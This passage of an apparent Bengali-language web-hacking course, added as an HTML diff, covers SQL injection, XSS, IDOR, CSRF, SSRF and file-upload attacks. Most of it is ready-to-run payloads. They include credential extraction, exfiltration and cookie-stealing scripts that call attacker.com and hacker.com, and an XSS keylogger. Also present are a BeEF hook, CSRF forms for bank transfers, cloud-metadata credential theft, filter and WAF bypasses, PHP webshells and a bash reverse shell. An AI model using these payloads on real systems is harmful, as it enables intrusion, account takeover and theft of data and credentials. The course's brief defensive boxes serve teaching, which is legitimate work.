+    <h3 class="ss">২. UNION-based SQLi — সবচেয়ে শক্তিশালী</h3>
+    <div class="code">
+<span class="c"># Step 1: Column সংখ্যা বের করো</span>
+' ORDER BY 1--    <span class="c"># Error নেই → কমপক্ষে ১টি column</span>
+' ORDER BY 2--    <span class="c"># Error নেই → কমপক্ষে ২টি column</span>
+' ORDER BY 3--    <span class="c"># Error → ২টি column আছে</span>
+
+<span class="c"># অথবা:</span>
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--   <span class="c"># Error না হলে ৩টি column</span>
+
+<span class="c"># Step 2: কোন column-এ data দেখায়?</span>
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--    <span class="c"># 'a' দেখা গেলে ২য় column visible</span>
+
+<span class="c"># Step 3: Database তথ্য বের করো (MySQL)</span>
+' UNION SELECT NULL,version(),NULL--           <span class="c"># DB version</span>
+' UNION SELECT NULL,database(),NULL--          <span class="c"># Current DB</span>
+' UNION SELECT NULL,user(),NULL--              <span class="c"># DB user</span>
+
+<span class="c"># Step 4: সব Database দেখো</span>
+' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
+
+<span class="c"># Step 5: Tables দেখো</span>
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--
+
+<span class="c"># Step 6: Columns দেখো</span>
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+<span class="c"># Step 7: Data বের করো!</span>
+' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
+    </div>
+
+    <h3 class="ss">৩. Blind SQLi — Boolean-based</h3>
+    <div class="code">
+<span class="c"># Response দেখে বোঝা যায় — সরাসরি error দেখায় না</span>
+
+<span class="c"># প্রশ্ন জিজ্ঞেস করো যার উত্তর True/False:</span>
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--
+<span class="c"># Page ঠিক থাকলে → প্রথম অক্ষর 'a'</span>
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='b'--
+<span class="c"># Page ভিন্ন হলে → প্রথম অক্ষর 'b' নয়</span>
+
+<span class="c"># এভাবে character by character পুরো username বের করা যায়</span>
+<span class="c"># তবে এটা অনেক ধীর → SQLmap ব্যবহার করো</span>
+    </div>
+
+    <h3 class="ss">৪. Time-based Blind SQLi</h3>
+    <div class="code">
+<span class="c"># Response দেখে না, সময় পরিমাপ করে</span>
+
+<span class="c"># MySQL:</span>
+' AND SLEEP(5)--                              <span class="c"># ৫ সেকেন্ড দেরি</span>
+' AND IF(1=1, SLEEP(5), 0)--                  <span class="c"># True → দেরি</span>
+' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--
+
+<span class="c"># MSSQL:</span>
+'; WAITFOR DELAY '0:0:5'--
+
+<span class="c"># PostgreSQL:</span>
+'; SELECT pg_sleep(5)--
+
+<span class="c"># Oracle:</span>
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+    </div>
+
+    <h3 class="ss">৫. Out-of-band SQLi</h3>
+    <div class="code">
+<span class="c"># DNS বা HTTP দিয়ে data বের করা</span>
+
+<span class="c"># MySQL (DNS exfiltration):</span>
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))--
+
+<span class="c"># MSSQL:</span>
+'; exec master..xp_dirtree '//attacker.com/a'--
+    </div>
+
+    <h2 class="s">Database-specific Payloads</h2>
+    <table>
+      <thead><tr><th>Database</th><th>Version</th><th>Current DB</th><th>Tables</th><th>Sleep</th></tr></thead>
+      <tbody>
+        <tr><td><strong>MySQL</strong></td><td>version()</td><td>database()</td><td>information_schema.tables</td><td>SLEEP(5)</td></tr>
+        <tr><td><strong>MSSQL</strong></td><td>@@version</td><td>db_name()</td><td>information_schema.tables</td><td>WAITFOR DELAY</td></tr>
+        <tr><td><strong>Oracle</strong></td><td>v$version</td><td>global_name</td><td>all_tables</td><td>DBMS_PIPE</td></tr>
+        <tr><td><strong>PostgreSQL</strong></td><td>version()</td><td>current_database()</td><td>information_schema.tables</td><td>pg_sleep(5)</td></tr>
+        <tr><td><strong>SQLite</strong></td><td>sqlite_version()</td><td>—</td><td>sqlite_master</td><td>—</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s">Special SQLi Techniques</h2>
+
+    <h3 class="ss">File Read ও Write</h3>
+    <div class="code">
+<span class="c"># MySQL — File Read (root privilege লাগবে)</span>
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL--
+
+<span class="c"># MySQL — File Write → Webshell upload!</span>
+' UNION SELECT NULL,'&lt;?php system($_GET["cmd"]); ?&gt;',NULL INTO OUTFILE '/var/www/html/shell.php'--
+
+<span class="c"># এখন: https://target.com/shell.php?cmd=whoami</span>
+    </div>
+
+    <h3 class="ss">Second-Order SQLi</h3>
+    <div class="code">
+<span class="c"># Registration-এ Payload store করা:</span>
+username: admin'--
+<span class="c"># সাথে সাথে কিছু হয় না</span>
+
+<span class="c"># পরে Password Change request:</span>
+UPDATE users SET password='newpass' WHERE username='admin'--'
+<span class="c"># ← এখন SQL Injection trigger হয়!</span>
+<span class="c"># admin-এর পাসওয়ার্ড পরিবর্তন হয়ে যাবে</span>
+    </div>
+
+    <h2 class="s">SQLmap — সম্পূর্ণ গাইড</h2>
+    <div class="code">
+<span class="c"># Basic Scan</span>
+sqlmap -u "https://target.com/product?id=1"
+sqlmap -u "https://target.com/product?id=1" --dbs         <span class="c"># সব DB</span>
+sqlmap -u "https://target.com/product?id=1" -D shop --tables  <span class="c"># Tables</span>
+sqlmap -u "https://target.com/product?id=1" -D shop -T users --dump  <span class="c"># Data!</span>
+
+<span class="c"># POST request</span>
+sqlmap -u "https://target.com/login" --data="user=admin&pass=1234"
+sqlmap -u "https://target.com/login" --data="user=admin&pass=1234" -p user  <span class="c"># Parameter</span>
+
+<span class="c"># Burp Request থেকে (সবচেয়ে সহজ!)</span>
+<span class="c"># Burp Proxy → Right click → Copy to file → request.txt</span>
+sqlmap -r request.txt --dbs
+
+<span class="c"># Cookie-based SQLi</span>
+sqlmap -u "https://target.com/" --cookie="id=1"
+
+<span class="c"># Authentication header</span>
+sqlmap -u "https://target.com/api/user/1" -H "Authorization: Bearer TOKEN"
+
+<span class="c"># Level ও Risk বাড়ানো</span>
+sqlmap -u "https://target.com/?id=1" --level=5 --risk=3
+
+<span class="c"># WAF Bypass</span>
+sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between,randomcase
+sqlmap -u "https://target.com/?id=1" --random-agent --delay=1
+
+<span class="c"># OS Shell পাওয়া!</span>
+sqlmap -u "https://target.com/?id=1" --os-shell
+sqlmap -u "https://target.com/?id=1" --os-pwn   <span class="c"># Meterpreter!</span>
+
+<span class="c"># সব একসাথে</span>
+sqlmap -u "https://target.com/?id=1" --dbs --users --passwords --privileges --batch
+    </div>
+
+    <h2 class="s">Comment Syntax ও WAF Bypass</h2>
+    <div class="code">
+<span class="c"># Comment — বাকি Query বাদ দিতে</span>
+--      <span class="c"># MySQL, MSSQL, Oracle, PostgreSQL</span>
+--+     <span class="c"># URL-encoded space</span>
+#       <span class="c"># MySQL only</span>
+/**/    <span class="c"># Block comment — WAF bypass-এ ব্যবহার</span>
+;%00    <span class="c"># Null byte</span>
+
+<span class="c"># WAF Bypass Techniques:</span>
+<span class="c"># Space replace করো:</span>
+SELECT/**/username/**/FROM/**/users
+SEL/**/ECT username FROM users    <span class="c"># Comment injection</span>
+SELECT%09username%09FROM%09users  <span class="c"># Tab</span>
+
+<span class="c"># Case variation:</span>
+SeLeCt UsErNaMe FrOm UsErS
+
+<span class="c"># Encoding:</span>
+%27 = '   %20 = space   %23 = #
+
+<span class="c"># Double encoding:</span>
+%2527 = ' (double URL encode)
+
+<span class="c"># SQLmap Tamper Scripts:</span>
+space2comment    <span class="c"># space → /**/ </span>
+between          <span class="c"># AND → BETWEEN</span>
+randomcase       <span class="c"># random case</span>
+charunicodeencode <span class="c"># Unicode encoding</span>
+apostrophemask   <span class="c"># ' → %EF%BC%87</span>
+    </div>
+
+    <div class="box bd">
+      <div class="bt">⚠️ SQLi সুরক্ষা</div>
+      <ul>
+        <li>Prepared Statement ও Parameterized Query ব্যবহার করো</li>
+        <li>Input Validation ও Sanitization</li>
+        <li>Stored Procedure</li>
+        <li>Database user-কে minimum privilege দাও</li>
+        <li>WAF ব্যবহার করো</li>
+        <li>Error message কখনো user-কে দেখাবে না</li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 4: XSS
+══════════════════════════════════════ -->
+<div class="chapter ch4">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 04</div>
+    <div class="ch-title">📜 XSS — Cross-Site Scripting</div>
+    <div class="ch-desc">ব্রাউজারে ক্ষতিকর JavaScript চালানো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">XSS কী?</h2>
+    <p>XSS হলো এমন একটি আক্রমণ যেখানে Malicious JavaScript কোড ওয়েবপেজে ইনজেক্ট করা হয় এবং ভিকটিম-এর ব্রাউজারে সেটি চলে।</p>
+
+    <div class="dg">
+<pre><span class="dy">Stored XSS এর প্রবাহ:</span>
+
+<span class="dr">Hacker</span>                 <span class="db">Website</span>                <span class="dy">Victim</span>
+   │                       │                        │
+   │──Comment এ Payload───→│                        │
+   │  &lt;script&gt;steal()&lt;/script&gt;                      │
+   │                       │ Database-এ save হলো   │
+   │                       │                        │
+   │                       │←─── Page দেখতে চাই────│
+   │                       │─── Page + Payload ────→│
+   │                       │                        │ ← Script চলে!
+   │←──── Cookie পাঠাল ────────────────────────────│
+   │    (Cookie চুরি হলো!)                          │
+</pre>
+    </div>
+
+    <h2 class="s">XSS-এর তিনটি ধরন</h2>
+
+    <h3 class="ss">১. Reflected XSS</h3>
+    <div class="code">
+<span class="c"># URL-এ payload থাকে, Server সেটা reflect করে</span>
+https://target.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+<span class="c"># Server-এর HTML Response:</span>
+<span class="r">&lt;p&gt;Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/p&gt;</span>
+
+<span class="c"># ব্যবহার: Phishing link পাঠানো</span>
+https://bank.com/search?q=&lt;script&gt;document.location='http://hacker.com/steal?c='+document.cookie&lt;/script&gt;
+    </div>
+
+    <h3 class="ss">২. Stored XSS — সবচেয়ে বিপজ্জনক</h3>
+    <div class="code">
+<span class="c"># Payload database-এ save হয়, সবাই দেখলেই চলে</span>
+<span class="c"># Comment, Profile Bio, Forum Post — এখানে ইনজেক্ট করো</span>
+
+<span class="c"># উদাহরণ Comment:</span>
+&lt;script&gt;
+  fetch('https://hacker.com/steal?cookie='+document.cookie)
+&lt;/script&gt;
+
+<span class="c"># অথবা admin-এর cookie চুরি করে admin account নেওয়া:</span>
+&lt;img src=x onerror="new Image().src='https://hacker.com/c?d='+document.cookie"&gt;
+    </div>
+
+    <h3 class="ss">৩. DOM-based XSS</h3>
+    <div class="code">
+<span class="c"># Client-side JavaScript নিজেই DOM-এ malicious content রাখে</span>
+<span class="c"># Server-এর কোনো ভূমিকা নেই</span>
+
+<span class="c"># দুর্বল JavaScript:</span>
+var search = document.URL.indexOf("search=");
+var term = document.URL.substring(search+7);
+document.write("You searched for: " + term);  <span class="c"># ← Dangerous!</span>
+
+<span class="c"># Attack URL:</span>
+https://target.com/page#search=&lt;img src=x onerror=alert(1)&gt;
+
+<span class="c"># Common DOM Sinks (বিপজ্জনক function):</span>
+document.write()
+innerHTML
+outerHTML
+eval()
+setTimeout("code")
+location.href = userInput
+    </div>
+
+    <h2 class="s">XSS Payload তালিকা — Context অনুযায়ী</h2>
+
+    <h3 class="ss">Basic Test Payload</h3>
+    <div class="code">
+<span class="c"># সহজ test:</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+<span class="c"># img ট্যাগ:</span>
+&lt;img src=x onerror=alert(1)&gt;
+&lt;img src="javascript:alert(1)"&gt;
+
+<span class="c"># svg:</span>
+&lt;svg onload=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+
+<span class="c"># body event:</span>
+&lt;body onload=alert(1)&gt;
+&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt;
+
+<span class="c"># Input field-এ:</span>
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+    </div>
+
+    <h3 class="ss">Cookie Stealing Payload</h3>
+    <div class="code">
+<span class="c"># Method 1: fetch</span>
+&lt;script&gt;fetch('https://hacker.com/steal?c='+btoa(document.cookie))&lt;/script&gt;
+
+<span class="c"># Method 2: Image</span>
+&lt;img src=x onerror="this.src='https://hacker.com/?c='+document.cookie"&gt;
+
+<span class="c"># Method 3: XMLHttpRequest</span>
+&lt;script&gt;
+var x=new XMLHttpRequest();
+x.open('GET','https://hacker.com/?c='+document.cookie);
+x.send();
+&lt;/script&gt;
+
+<span class="c"># Method 4: XSS to Admin panel takeover</span>
+&lt;script&gt;
+  document.location='https://target.com/admin/add-user?user=hacker&pass=hacker123&role=admin'
+&lt;/script&gt;
+    </div>
+
+    <h3 class="ss">Keylogger via XSS</h3>
+    <div class="code">
+&lt;script&gt;
+document.onkeypress = function(e) {
+  fetch('https://hacker.com/log?k=' + String.fromCharCode(e.keyCode));
+}
+&lt;/script&gt;
+    </div>
+
+    <h2 class="s">XSS Filter Bypass</h2>
+    <div class="code">
+<span class="c"># script ট্যাগ block হলে:</span>
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;video src onerror=alert(1)&gt;
+
+<span class="c"># alert block হলে:</span>
+&lt;script&gt;confirm(1)&lt;/script&gt;
+&lt;script&gt;prompt(1)&lt;/script&gt;
+&lt;script&gt;console.log(1)&lt;/script&gt;
+
+<span class="c"># Encoding bypass:</span>
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;   <span class="c"># Base64: alert(1)</span>
+&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;  <span class="c"># Unicode</span>
+
+<span class="c"># HTML Entity:</span>
+&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+
+<span class="c"># Case variation:</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;
+
+<span class="c"># Nested tag (filter শুধু একবার চলে):</span>
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+    </div>
+
+    <h2 class="s">BeEF — Browser Exploitation Framework</h2>
+    <div class="code">
+<span class="c"># BeEF Kali-তে</span>
+beef-xss
+<span class="c"># Dashboard: http://127.0.0.1:3000/ui/panel</span>
+<span class="c"># Default: beef/beef</span>
+
+<span class="c"># Hook script Victim-এ ইনজেক্ট করো:</span>
+&lt;script src="http://attacker.com:3000/hook.js"&gt;&lt;/script&gt;
+
+<span class="c"># BeEF দিয়ে যা করা যায়:</span>
+<span class="c"># - Browser history দেখা</span>
+<span class="c"># - Screenshot নেওয়া</span>
+<span class="c"># - Keylogger চালানো</span>
+<span class="c"># - Fake login page দেখানো</span>
+<span class="c"># - Network scan করা</span>
+<span class="c"># - Redirect করা</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 5: IDOR ও Access Control
+══════════════════════════════════════ -->
+<div class="chapter ch5">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 05</div>
+    <div class="ch-title">🔍 IDOR ও Broken Access Control</div>
+    <div class="ch-desc">OWASP #1 — সবচেয়ে বেশি পাওয়া যায় এমন ভালনারেবিলিটি</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">IDOR কী?</h2>
+    <p>IDOR (Insecure Direct Object Reference) মানে — object reference (যেমন user ID, file ID) পরিবর্তন করে অন্যের data access করা।</p>
+
+    <div class="dg">
+<pre>তুমি login করো: user_id = 1001
+তোমার profile URL: https://target.com/profile?id=1001
+
+<span class="dr">IDOR Attack:</span>
+URL পরিবর্তন করো: https://target.com/profile?id=1002
+→ অন্য user-এর profile দেখা যাচ্ছে!
+
+https://target.com/profile?id=1   → Admin-এর profile!
+https://target.com/invoice?id=99  → অন্য user-এর invoice!
+</pre>
+    </div>
+
+    <h2 class="s">IDOR খোঁজার পদ্ধতি</h2>
+    <div class="code">
+<span class="c"># ১. URL Parameter</span>
+/api/user?id=123           <span class="c"># → id=124, 125, 1</span>
+/download?file_id=55       <span class="c"># → file_id=1, 2, 54</span>
+/order?order_id=ABC123     <span class="c"># Sequential বা predictable?</span>
+
+<span class="c"># ২. POST Body</span>
+{"user_id": 123, "action": "get_profile"}
+<span class="c"># → user_id: 124 করে দেখো</span>
+
+<span class="c"># ৩. API Endpoint</span>
+GET /api/v1/users/1001/orders
+<span class="c"># → /api/v1/users/1002/orders → অন্যের order!</span>
+
+<span class="c"># ৪. Header</span>
+X-User-ID: 1001
+<span class="c"># Header পরিবর্তন করো</span>
+
+<span class="c"># ৫. Cookie</span>
+Cookie: user=1001
+<span class="c"># Cookie value পরিবর্তন</span>
+
+<span class="c"># ৬. Base64/Hash encoded ID</span>
+/profile?id=MTAwMQ==       <span class="c"># Base64 → 1001</span>
+<span class="c"># Decode → পরিবর্তন → Encode → পাঠাও</span>
+echo -n "1002" | base64    <span class="c"># MTAwMg==</span>
+    </div>
+
+    <h2 class="s">Horizontal vs Vertical Access Control</h2>
+    <div class="g2">
+      <div class="card">
+        <h4>↔️ Horizontal Escalation</h4>
+        <p>একই role-এর অন্য user-এর data access</p>
+        <ul>
+          <li>User A → User B-এর profile</li>
+          <li>তোমার order → অন্যের order</li>
+          <li>তোমার message → অন্যের message</li>
+        </ul>
+        <p><strong>উদাহরণ:</strong> /profile?id=1002</p>
+      </div>
+      <div class="card dc">
+        <h4>↕️ Vertical Escalation</h4>
+        <p>কম সুবিধার account থেকে বেশি সুবিধায় যাওয়া</p>
+        <ul>
+          <li>Normal User → Admin panel</li>
+          <li>Read-only → Write access</li>
+          <li>Customer → Employee data</li>
+        </ul>
+        <p><strong>উদাহরণ:</strong> /admin/users</p>
+      </div>
+    </div>
+
+    <h2 class="s">Business Logic Flaws</h2>
+    <div class="code">
+<span class="c"># ১. Negative Price / Quantity</span>
+POST /checkout
+{"product_id": 1, "quantity": -5, "price": 100}
+<span class="c"># → মোট: -500 → Account-এ credit!</span>
+
+<span class="c"># ২. Coupon বারবার ব্যবহার</span>
+<span class="c"># একই coupon code বারবার apply করো</span>
+<span class="c"># Race Condition দিয়ে:</span>
+<span class="c"># দুটো request একসাথে পাঠাও!</span>
+
+<span class="c"># ৩. Password Reset Token Reuse</span>
+<span class="c"># একটি valid token দিয়ে অন্য user-এর reset</span>
+POST /reset-password
+{"token": "validtoken", "username": "admin", "newpass": "hacked"}
+
+<span class="c"># ৪. Account Takeover via Email Change</span>
+<span class="c"># Email change করো → Verification link-এ user_id পাল্টাও</span>
+
+<span class="c"># ৫. Mass Assignment</span>
+POST /update-profile
+{"name": "Saimum", "email": "s@s.com", "role": "admin"}
+<span class="c"># API অতিরিক্ত field accept করলে role পাল্টানো যাবে!</span>
+    </div>
+
+    <h2 class="s">Burp Intruder দিয়ে IDOR Automation</h2>
+    <div class="code">
+<span class="c"># Request capture করো Burp-এ</span>
+<span class="c"># GET /api/invoice?id=§1001§ HTTP/1.1</span>
+<span class="c"># Intruder → Sniper → Payload: Number list 1-2000</span>
+<span class="c"># Start Attack → Response Length দেখো</span>
+<span class="c"># ভিন্ন length মানে আলাদা data!</span>
+
+<span class="c"># ffuf দিয়ে IDOR fuzz:</span>
+ffuf -u "https://target.com/api/user/FUZZ" -w numbers.txt -H "Cookie: session=yours" -mc 200
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 6: CSRF
+══════════════════════════════════════ -->
+<div class="chapter ch6">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 06</div>
+    <div class="ch-title">🔄 CSRF — Cross-Site Request Forgery</div>
+    <div class="ch-desc">ভিকটিমকে দিয়ে অজান্তে কাজ করানো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">CSRF কীভাবে কাজ করে?</h2>
+    <div class="dg">
+<pre><span class="dy">Attack Flow:</span>
+
+১. ভিকটিম bank.com-এ login করে আছে
+   (Browser-এ bank.com-এর Cookie আছে)
+
+২. হ্যাকার evil.com তৈরি করে:
+   &lt;img src="https://bank.com/transfer?to=hacker&amount=50000"&gt;
+
+৩. হ্যাকার ভিকটিমকে evil.com-এর link পাঠায়
+
+৪. ভিকটিম evil.com খুললে → Image load হয়
+   → Browser bank.com-এ GET request পাঠায়
+   → Cookie automatically যায়
+   → Bank মনে করে ভিকটিম নিজেই request করেছে
+   → টাকা চলে যায়!
+</pre>
+    </div>
+
+    <h2 class="s">CSRF Exploit তৈরি</h2>
+
+    <h3 class="ss">GET-based CSRF</h3>
+    <div class="code">
+<span class="c"># Simple image tag</span>
+&lt;img src="https://bank.com/transfer?to=hacker&amount=10000" style="display:none"&gt;
+
+<span class="c"># অথবা iframe</span>
+&lt;iframe src="https://target.com/delete-account?confirm=yes" style="display:none"&gt;&lt;/iframe&gt;
+    </div>
+
+    <h3 class="ss">POST-based CSRF — Auto-submit Form</h3>
+    <div class="code">
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="https://bank.com/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="to" value="hacker_account"&gt;
+    &lt;input type="hidden" name="amount" value="50000"&gt;
+    &lt;input type="hidden" name="currency" value="BDT"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+<span class="c"># ভিকটিম এই page খুললেই automatically form submit হবে!</span>
+    </div>
+
+    <h3 class="ss">JSON CSRF</h3>
+    <div class="code">
+<span class="c"># API JSON request-এ CSRF</span>
+&lt;script&gt;
+fetch('https://api.target.com/user/update', {
+  method: 'POST',
+  credentials: 'include',    <span class="c">← Cookie পাঠাবে</span>
+  headers: {'Content-Type': 'text/plain'},
+  body: '{"email":"hacker@evil.com","role":"admin"}'
+});
+&lt;/script&gt;
+    </div>
+
+    <h2 class="s">CSRF Token Bypass</h2>
+    <div class="code">
+<span class="c"># ১. Token না পাঠালে কী হয়?</span>
+<span class="c"># CSRF token field বাদ দিয়ে request পাঠাও</span>
+
+<span class="c"># ২. Token সরিয়ে ফেলো</span>
+csrf_token=&nbsp;&nbsp;&nbsp;   <span class="c"># Empty value</span>
+
+<span class="c"># ৩. Token অন্য session থেকে ব্যবহার</span>
+<span class="c"># তোমার নিজের CSRF token ভিকটিমের request-এ দাও</span>
+
+<span class="c"># ৪. Token Double Submit Cookie</span>
+<span class="c"># শুধু Cookie match করে → Cookie inject করো</span>
+
+<span class="c"># ৫. Referer Header Remove করো</span>
+<span class="c"># &lt;meta name="referrer" content="no-referrer"&gt;</span>
+
+<span class="c"># ৬. CORS Misconfiguration + CSRF</span>
+fetch('https://target.com/api/data', {credentials:'include'})
+<span class="c"># CORS allow করলে response পড়া যাবে</span>
+    </div>
+
+    <div class="box bs">
+      <div class="bt">✅ CSRF সুরক্ষা</div>
+      <ul>
+        <li>CSRF Token (Synchronizer Token Pattern)</li>
+        <li>SameSite=Strict Cookie Flag</li>
+        <li>Origin/Referer Header Validation</li>
+        <li>Double Submit Cookie</li>
+        <li>CORS সঠিকভাবে কনফিগার করো</li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 7: SSRF
+══════════════════════════════════════ -->
+<div class="chapter ch7">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 07</div>
+    <div class="ch-title">🌐 SSRF — Server-Side Request Forgery</div>
+    <div class="ch-desc">সার্ভারকে দিয়ে অভ্যন্তরীণ সিস্টেমে request করানো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">SSRF কী?</h2>
+    <p>SSRF হলো এমন একটি আক্রমণ যেখানে হ্যাকার সার্ভারকে দিয়ে অভ্যন্তরীণ বা বাহ্যিক URL-এ request করায়।</p>
+
+    <div class="dg">
+<pre><span class="dy">স্বাভাবিক ব্যবহার:</span>
+User → Server → https://external-api.com
+
+<span class="dr">SSRF Attack:</span>
+Hacker → Server → http://169.254.169.254/  (AWS Metadata!)
+Hacker → Server → http://localhost:8080/admin  (Internal Admin!)
+Hacker → Server → http://internal-db:5432/     (Database!)
+
+সার্ভার Internal Network-এ আছে → Firewall bypass!
+</pre>
+    </div>
+
+    <h2 class="s">SSRF কোথায় খুঁজবে?</h2>
+    <div class="code">
+<span class="c"># URL parameter যেখানে আছে:</span>
+https://target.com/fetch?url=https://external.com
+https://target.com/proxy?site=https://news.com
+https://target.com/webhook?callback=https://api.com
+https://target.com/pdf?source=https://page.com
+
+<span class="c"># POST body:</span>
+{"url": "https://external-api.com/data"}
+{"website": "https://preview.com"}
+{"avatar_url": "https://cdn.example.com/pic.jpg"}
+
+<span class="c"># Import/Upload from URL:</span>
+<span class="c"># "Upload from URL" feature</span>
+<span class="c"># "Import data from URL"</span>
+<span class="c"># "Preview URL"</span>
+    </div>
+
+    <h2 class="s">Basic SSRF Exploitation</h2>
+    <div class="code">
+<span class="c"># Internal services probe করা</span>
+url=http://127.0.0.1
+url=http://localhost
+url=http://0.0.0.0
+
+<span class="c"># Internal port scan</span>
+url=http://127.0.0.1:22       <span class="c"># SSH</span>
+url=http://127.0.0.1:3306     <span class="c"># MySQL</span>
+url=http://127.0.0.1:6379     <span class="c"># Redis</span>
+url=http://127.0.0.1:9200     <span class="c"># Elasticsearch</span>
+url=http://127.0.0.1:8080     <span class="c"># Internal web server</span>
+
+<span class="c"># Internal network scan</span>
+url=http://192.168.0.1        <span class="c"># Router</span>
+url=http://10.0.0.1           <span class="c"># Internal network</span>
+url=http://172.16.0.1
+    </div>
+
+    <h2 class="s">Cloud Metadata — সবচেয়ে বিপজ্জনক</h2>
+    <div class="code">
+<span class="c"># ⭐ AWS EC2 Metadata — Secret Key চুরি!</span>
+url=http://169.254.169.254/latest/meta-data/
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2_ROLE
+<span class="c"># Response: AWS Access Key, Secret Key, Token → AWS পুরো control!</span>
+
+<span class="c"># Google Cloud Metadata</span>
+url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+url=http://169.254.169.254/computeMetadata/v1/
+
+<span class="c"># Azure Metadata</span>
+url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+<span class="c"># Kubernetes Service Account Token</span>
+url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
+    </div>
+
+    <h2 class="s">SSRF Filter Bypass</h2>
+    <div class="code">
+<span class="c"># IP Address Bypass:</span>
+http://127.0.0.1      → http://2130706433     <span class="c"># Decimal</span>
+http://127.0.0.1      → http://0177.0.0.01    <span class="c"># Octal</span>
+http://127.0.0.1      → http://0x7f000001     <span class="c"># Hex</span>
+http://127.0.0.1      → http://127.1          <span class="c"># Short form</span>
+http://127.0.0.1      → http://[::1]          <span class="c"># IPv6</span>
+http://127.0.0.1      → http://localhost      <span class="c"># Hostname</span>
+
+<span class="c"># DNS Rebinding:</span>
+<span class="c"># hacker.com → public IP (filter পাস) → 127.0.0.1 (rebind)</span>
+
+<span class="c"># Open Redirect চেইন করা:</span>
+url=https://trusted.com/redirect?to=http://169.254.169.254/
+
+<span class="c"># URL Scheme Bypass:</span>
+file:///etc/passwd           <span class="c"># File read!</span>
+dict://127.0.0.1:6379/info   <span class="c"># Redis SSRF</span>
+gopher://127.0.0.1:25/...    <span class="c"># SMTP SSRF</span>
+ftp://127.0.0.1:21/          <span class="c"># FTP</span>
+    </div>
+
+    <h2 class="s">Blind SSRF Detection</h2>
+    <div class="code">
+<span class="c"># Burp Collaborator দিয়ে (out-of-band)</span>
+url=https://your-burp-collaborator.net
+<span class="c"># Collaborator-এ DNS/HTTP request এলে → SSRF আছে!</span>
+
+<span class="c"># Interactsh দিয়ে (Free alternative)</span>
+url=https://xxx.oast.fun
+
+<span class="c"># Webhook.site দিয়ে</span>
+url=https://webhook.site/your-unique-id
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 8: File Upload ও Path Traversal
+══════════════════════════════════════ -->
+<div class="chapter ch8">
+  <div class="ch-hdr">
+    <div class="ch-label">CHAPTER 08</div>
+    <div class="ch-title">📂 File Upload, LFI ও Path Traversal</div>
+    <div class="ch-desc">File-based attacks — Webshell থেকে /etc/passwd পড়া</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">Malicious File Upload</h2>
+    <div class="code">
+<span class="c"># সহজ PHP Webshell</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php echo shell_exec($_REQUEST['cmd']); ?&gt;
+&lt;?php passthru($_POST['c']); ?&gt;
+
+<span class="c"># Shell upload করলে:</span>
+https://target.com/uploads/shell.php?cmd=whoami
+https://target.com/uploads/shell.php?cmd=cat+/etc/passwd
+https://target.com/uploads/shell.php?cmd=ls+-la+/var/www/
+
+<span class="c"># Reverse Shell PHP:</span>
+https://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.1/4444+0>%261'
+    </div>
+
